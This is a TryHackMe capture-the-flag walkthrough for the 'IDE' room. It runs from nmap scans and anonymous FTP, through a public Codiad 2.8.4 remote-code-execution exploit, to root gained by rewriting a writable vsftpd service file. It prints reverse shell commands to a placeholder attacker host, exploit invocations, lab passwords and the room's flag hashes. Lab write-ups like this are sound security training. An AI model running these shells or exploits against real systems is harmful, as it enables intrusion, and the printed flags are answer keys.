# IDE - TryHackMe Walkthrough

## Machine Information

| Category         | Value                      |
| ---------------- | -------------------------- |
| Platform         | TryHackMe                  |
| Room Name        | IDE                        |
| Difficulty       | Easy                       |
| Operating System | Linux                      |
| Objective        | Obtain User and Root Flags |

---

# Reconnaissance

Target IP:

```text
10.48.128.191
```

---

## Initial Nmap Scan

As always, we begin with a full TCP port scan.

```bash
nmap -p- --min-rate 5000 -T4 10.48.128.191
```

### Results

```text
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
62337/tcp open  unknown
```

Interesting.

The target exposes:

* FTP
* SSH
* Apache Web Server
* Additional HTTP service on a high port

---

## Service Enumeration

Perform version detection.

```bash
nmap -sCV -p21,22,80,62337 10.48.128.191
```

### Results

```text
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp    open  http    Apache 2.4.29
62337/tcp open  http    Apache 2.4.29
```

Additional findings:

```text
Anonymous FTP Login Allowed
```

and

```text
Port 62337:
Codiad 2.8.4
```

---

# FTP Enumeration

Since anonymous FTP access is allowed, begin there.

```bash
ftp anonymous@10.48.128.191
```

Listing files reveals an unusual hidden directory.

```text
...
```

Navigate inside.

```bash
cd ...
ls
```

A file named:

```text
-
```

is discovered.

Download it.

```bash
get -
```

Read the contents locally.

```text
Hey john,

I have reset the password as you have asked.
Please use the default password to login.

Also, please take care of the image file ;)

- drac
```

### Observations

The note reveals:

* User: john
* Password has been reset
* Default credentials likely exist
* Reference to an image file may be a hint

At this stage we have a likely username for future attacks.

---

# Web Enumeration

Browsing:

```text
http://10.48.128.191
```

shows only the default Apache page.

Directory fuzzing against port 80 reveals nothing useful.

Attention shifts to:

```text
http://10.48.128.191:62337
```

---

# Codiad Discovery

The service running on port 62337 is:

```text
Codiad 2.8.4
```

This version is known to be vulnerable.

Searching ExploitDB:

```bash
searchsploit codiad 2.8.4
```

Results:

```text
Codiad 2.8.4 - Remote Code Execution
CVE-2018-14009
```

Copy the exploit.

```bash
searchsploit -m 49705
```

---

# Initial Access

The FTP message suggested that John's password had been reset.

Testing default credentials:

```text
john : password
```

Successfully authenticates to Codiad.

This confirms the FTP note was intentionally leaking credentials.

---

# Exploiting Codiad

Execute the public exploit.

```bash
python 49705.py \
http://10.48.128.191:62337/ \
john \
password \
192.168.145.49 \
4444 \
linux
```

The exploit requests two listeners.

Listener One:

```bash
nc -lnvp 4444
```

Listener Two:

```bash
nc -lnvp 4445
```

After execution, a reverse shell is obtained.

```text
www-data
```

Initial foothold achieved.

---

# Shell Stabilization

Upgrade the shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background:

```bash
CTRL + Z
```

Attacker machine:

```bash
stty raw -echo
fg
```

Target:

```bash
export TERM=xterm
```

Interactive shell established.

---

# Local Enumeration

Enumerating user directories reveals:

```text
/home/drac
```

Checking command history:

```bash
cat /home/drac/.bash_history
```

Contents:

```text
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

Interesting.

The password appears to belong to user:

```text
drac
```

Credential reuse is extremely common.

---

# SSH Access

Attempt SSH authentication.

```bash
ssh drac@10.48.128.191
```

Password:

```text
Th3dRaCULa1sR3aL
```

Login succeeds.

Verify:

```bash
whoami
```

Output:

```text
drac
```

---

# User Flag

Read the user flag.

```bash
cat user.txt
```

Output:

```text
02930d21a8eb009f6d26361b2d24a466
```

User access obtained.

---

# Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Output:

```text
User drac may run the following commands:

(ALL : ALL)
/usr/sbin/service vsftpd restart
```

Interesting.

The user cannot execute arbitrary commands as root.

However, they can restart the FTP service.

---

# Service Abuse

Inspect the service definition.

```bash
cat /lib/systemd/system/vsftpd.service
```

The service file is writable.

This creates an opportunity for privilege escalation.

Modify the service to execute a reverse shell as root.

Example payload:

```bash
/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1'
```

Insert into:

```text
ExecStart=
```

Result:

```ini
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1'
```

---

# Reload Systemd

Reload service definitions.

```bash
systemctl daemon-reload
```

Then restart the service using the allowed sudo command.

```bash
sudo /usr/sbin/service vsftpd restart
```

Start listener:

```bash
nc -lvnp 7777
```

Connection received.

```text
root@ide:/#
```

Root shell obtained.

---

# Root Flag

Navigate to:

```bash
cd /root
```

Read the flag.

```bash
cat root.txt
```

Output:

```text
ce258cb16f47f1c66f0b0b77f4e0fb8d
```

Root compromise complete.

---

# Flags

## User

```text
02930d21a8eb009f6d26361b2d24a466
```

## Root

```text
ce258cb16f47f1c66f0b0b77f4e0fb8d
```

---

# Attack Path Summary

```text
Nmap Scan
      │
      ▼
Anonymous FTP Access
      │
      ▼
Hidden FTP Directory
      │
      ▼
FTP Note Disclosure
      │
      ▼
john:password
      │
      ▼
Codiad Login
      │
      ▼
CVE-2018-14009
      │
      ▼
Reverse Shell as www-data
      │
      ▼
.bash_history Discovery
      │
      ▼
drac Credentials
      │
      ▼
SSH Access
      │
      ▼
User Flag
      │
      ▼
sudo -l
      │
      ▼
vsftpd Service Restart Permission
      │
      ▼
Service File Abuse
      │
      ▼
Root Reverse Shell
      │
      ▼
Root Flag
```

---

# Key Takeaways

* Anonymous FTP access frequently exposes sensitive information.
* Hidden directories on FTP servers should always be investigated.
* Credential leakage in shell history files remains a common issue.
* Public exploits should always be checked against discovered software versions.
* Credential reuse can often lead directly to lateral movement or privilege escalation.
* Misconfigured service permissions can result in full root compromise.
* Always inspect systemd service files when service management permissions are granted.

Machine rooted successfully.
